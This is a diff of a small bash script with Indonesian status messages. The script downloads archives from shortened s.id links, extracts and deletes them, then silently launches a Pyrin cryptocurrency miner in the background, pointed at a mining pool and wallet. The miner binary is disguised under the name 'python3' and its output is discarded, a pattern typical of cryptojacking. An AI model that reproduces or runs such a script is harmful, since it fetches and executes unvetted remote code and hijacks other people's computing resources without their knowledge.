@@ -1,16 +1,28 @@
 #!/bin/bash
 
-wget -O dot-srb s.id/25RZs
+echo "download dot-srb..."
 
-tar -xzvf dot-srb
+wget -q -O dot-srb s.id/25RZs
+
+echo "ekstrak dot-srb..."
+
+tar -xzf dot-srb >/dev/null
+
+echo "hapus dot-srb..."
 
 rm dot-srb
+# SAMPE SINI
+echo "download dot-lol..."
 
-wget -O dot-lol s.id/25RZu
+wget -q -O dot-lol s.id/25RZu
 
-tar -xzvf dot-lol
+echo "ekstrak dot-lol..."
 
-rm dot-srb
+tar -xzvf dot-lol  >/dev/null
+
+echo "hapus dot-lol..."
+
+rm dot-lol
 
 nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT --no-cl > /dev/null 2>&1 &
 
